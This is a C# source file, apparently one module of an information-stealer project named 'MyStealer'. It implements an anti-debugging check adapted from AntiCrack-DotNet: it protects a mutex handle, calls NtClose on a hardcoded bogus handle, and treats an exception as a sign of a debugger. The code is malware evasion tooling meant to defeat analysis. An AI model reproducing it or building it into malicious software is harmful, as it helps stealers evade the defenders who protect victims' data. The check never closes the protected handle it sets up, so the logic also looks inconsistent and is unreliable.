using System;
using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check.Exploits
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
    /// </summary>
    public class CloseProtectedHandle : CheckBase
    {
        public override string Name => "NtClose(protected-handle)";

        public override bool CheckActive()
        {
            var hMutex = CreateMutexA(IntPtr.Zero, false, new Random().Next(0, 9999999).ToString());
            const uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002u;
            SetHandleInformation(hMutex, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
            try
            {
                NtClose((IntPtr)0x13371337L);
                return false;
            }
            catch
            {
                return true;
            }
        }
    }
}
